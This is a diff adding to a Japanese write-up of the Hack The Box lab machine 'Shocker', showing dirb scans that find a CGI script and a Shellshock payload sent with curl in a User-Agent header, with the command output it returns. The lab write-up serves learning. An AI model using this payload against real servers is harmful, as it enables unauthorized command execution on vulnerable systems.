@@ -106,12 +106,130 @@
   * dirbを実行してみる。
 
     ```bash
-    dirb http://10.10.10.56/
+    ┌──(kali㉿kali)-[~]
+    └─$ sudo dirb http://10.10.10.56
+    -----------------
+    DIRB v2.22    
+    By The Dark Raver
+    -----------------
+    
+    START_TIME: Sat Jul  9 11:35:36 2022
+    URL_BASE: http://10.10.10.56/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    
+    -----------------
+    GENERATED WORDS: 4612
+    
+    ---- Scanning URL: http://10.10.10.56/ ----
+    + http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                     
+    + http://10.10.10.56/index.html (CODE:200|SIZE:137)                   
+    + http://10.10.10.56/server-status (CODE:403|SIZE:299)
+    -----------------
+    END_TIME: Sat Jul  9 11:44:29 2022
+    DOWNLOADED: 4612 - FOUND: 3
+    ```
+    
+
+* /cgi-bin/にアクセスすると403 forbittenがかえってくる
+
+  ![image-20220709113945137](img/image-20220709113945137.png)
+
+  * [cgiとは](https://www.tohoho-web.com/wwwcgi1.htm)
+    * 「CGI」とはWWWサーバーがプログラムを起動する際の起動方法（環境変数の名前や値）を定めた仕様の名称。この仕様に基づいて作成されたプログラムを「CGIプログラム」と呼ぶ。「CGIプログラム」のうち、Perl, awk, shなどコンパイル作業が不要なスクリプト言語で記述されたものを「CGIスクリプト」と呼びます。CGIプログラムはPerlで記述されたものが多いが、環境変数と標準入力を参照できて、結果を標準出力に書き出せるものであればC言語、C＋＋言語、VisualBasicでもなんでも構わない。
+  * cgi-binディレクトリがあるということは、その配下に何かしらのcgiスクリプトがあることが疑われる。
+
+* オプションで-Xオプションを指定し、探索したい拡張子を指定して実行する。
+
+  ```bash
+  └─$ dirb http://10.10.10.56/cgi-bin/ -X .sh,.pl,.txt,.php,.py
+  -----------------
+  DIRB v2.22    
+  By The Dark Raver
+  -----------------
+  
+  START_TIME: Sat Jul  9 11:50:38 2022
+  URL_BASE: http://10.10.10.56/cgi-bin/
+  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+  EXTENSIONS_LIST: (.sh,.pl,.txt,.php,.py) | (.sh)(.pl)(.txt)(.php)(.py) [NUM = 5]
+  
+  -----------------
+  GENERATED WORDS: 4612                                                          
+  ---- Scanning URL: http://10.10.10.56/cgi-bin/ ----
+  + http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)
+  -----------------
+  END_TIME: Sat Jul  9 12:34:55 2022
+  DOWNLOADED: 23060 - FOUND: 1
+  ```
+
+  *  -X <extensions> / -x <exts_file> : Append each word with this extensions.
+
+* user.shの中身を見てみる。
+
+  ```bash
+  wget http://10.10.10.56/cgi-bin/user.sh
+  --2022-07-09 11:59:40--  http://10.10.10.56/cgi-bin/user.sh
+  10.10.10.56:80 に接続しています... 接続しました。
+  HTTP による接続要求を送信しました、応答を待っています... 200 OK
+  長さ: 特定できません [text/x-sh]
+  `user.sh' に保存中
+  
+  user.sh                   [ <=>                      ]     119  --.-KB/s 時間 0s       
+  
+  2022-07-09 11:59:41 (307 KB/s) - `user.sh' へ保存終了 [119]
+  
+  ┌──(kali㉿kali)-[~]
+  └─$ ls
+  Desktop    Downloads  Pictures  Templates  ansible  user.sh
+  Documents  Music      Public    Videos     pentest
+  
+  ┌──(kali㉿kali)-[~]
+  └─$ cat user.sh 
+  Content-Type: text/plain
+  
+  Just an uptime test script
+  
+   22:59:41 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00
+  
+  
+  ```
+
+  * ファイルの内容から、Linuxサーバーのuptimeコマンドを実行していると推測（難しい...)
+
+    * [uptimeコマンド](https://eng-entrance.com/linux-command-uptime)
+      * Linuxの稼働時間を表示する
+
+  * shellにコマンドを渡して実行しているという挙動からShellShockの脆弱性を想起するらしい。
+
+    https://www.digicert.com/jp/blog/shellshock-cve-2014-6271/
+
+  * Nmap NSEのスクリプトを活用し、shellshockの脆弱性が内在しているかを確認する。
+
+    ```
+    
+    ```
+
+  * 脆弱性を悪用してコマンド実行してみる
+
+    ```c
+    //実行できなかった
+    curl -A "() { :;};echo hello;/usr/bin/id" [http://10.10.10.56/cgi-bin/user.sh](http://10.10.10.56/cgi-bin/user.sh)
+    ```
+
+  * writeupのコマンドで実行できなかったので別のサイトを参照
+
+    https://www.linkedin.com/pulse/hack-box-htb-shocker-walkthrough-abdulhakim-%C3%B6ner
+
+    ```bash
+     curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh
+    
+    uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
     ```
 
     
 
+  * なぜ「() { :;};」でコマンドが実行されるかの解説
 
+    https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
 
 ## 所感
 
